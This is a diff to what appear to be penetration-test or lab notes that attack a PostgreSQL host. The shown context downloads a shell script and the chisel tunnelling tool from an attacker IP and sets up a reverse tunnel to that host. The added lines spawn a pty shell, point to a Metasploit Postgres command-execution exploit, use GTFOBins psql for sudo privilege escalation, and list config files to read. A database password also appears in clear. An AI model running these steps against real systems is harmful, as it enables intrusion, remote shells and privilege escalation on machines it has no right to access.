@@ -266,7 +266,20 @@ wget http://192.168.45.160/shell.sh -O shell.sh
 pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");
 
 wget http://192.168.45.160/chisel -O chisel
-./chisel client 192.168.45.160:80 R:5432:0.0.0.0:5432
+./chisel client 192.168.45.160:8090 R:5433:0.0.0.0:5432
 
-psql -h 127.0.0.1 -p 5432 -d postgres -U postgres
+# run this from the target
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+sudo psql -h 127.0.0.1 -p 5432 -U postgres
+
+# try this exploit
+https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/postgres/postgres_copy_from_program_cmd_exec.md
+
+# the above exploit gives you a shell as the postgres user, sudo -l tells you that we can run the psql command using sudo
+# https://gtfobins.github.io/gtfobins/psql/ - exploit using this
+
+/usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf
+/usr/lib/tmpfiles.d/vsftpd.conf
+/usr/share/nginx
+etc/nginx/nginx.conf
 ```
